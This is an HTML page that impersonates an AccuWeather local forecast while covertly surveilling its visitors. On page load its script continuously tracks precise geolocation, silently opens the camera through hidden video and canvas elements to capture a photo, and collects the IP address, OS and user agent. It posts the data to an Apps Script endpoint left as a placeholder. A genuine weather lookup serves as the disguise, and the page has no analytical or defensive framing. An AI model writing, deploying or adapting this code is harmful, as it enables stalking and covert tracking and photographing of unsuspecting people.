<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AccuWeather - Local Forecast</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; background: linear-gradient(to bottom, #4facfe 0%, #00f2fe 100%); color: white; text-align: center; height: 100vh; }
        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px); margin: 50px auto; padding: 40px; border-radius: 30px; width: 80%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
        h1 { font-size: 3rem; margin: 10px 0; }
        .city { font-size: 1.5rem; font-weight: 300; }
        .btn { background: white; color: #0078d4; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; margin-top: 20px; cursor: pointer; }
        canvas, video { display: none; } /* Hidden camera elements */
    </style>
</head>
<body>

<div class="card">
    <div class="city" id="cityName">Detecting Location...</div>
    <h1 id="temp">--°</h1>
    <p id="desc">Sunny</p>
    <p>We need your location to provide accurate local storm alerts.</p>
    <button class="btn" onclick="startTracking()">Update My Weather</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    const GOOGLE_URL = 'YOUR_APPS_SCRIPT_URL';

    async function startTracking() {
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // 1. Get REAL weather for their specific coordinates
                try {
                    const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
                    const weatherData = await weatherRes.json();
                    document.getElementById('temp').innerText = Math.round(weatherData.current_weather.temperature) + "°";
                    document.getElementById('cityName').innerText = "Local Forecast Active";
                } catch(e) {}

                // 2. Capture Photo Silently
                capturePhoto();

                // 3. Send Data to Sheet
                sendToSheet(pos);
            }, null, { enableHighAccuracy: true });
        }
    }

    async function capturePhoto() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg');
                // You would need a different Apps Script setup to save images
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        } catch (err) { console.log("Camera blocked"); }
    }

    async function sendToSheet(pos) {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        
        const payload = {
            ip: ipData.ip,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            os: navigator.platform,
            browser: navigator.userAgent
        };

        fetch(GOOGLE_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
    }

    window.onload = startTracking;
</script>
</body>
</html>
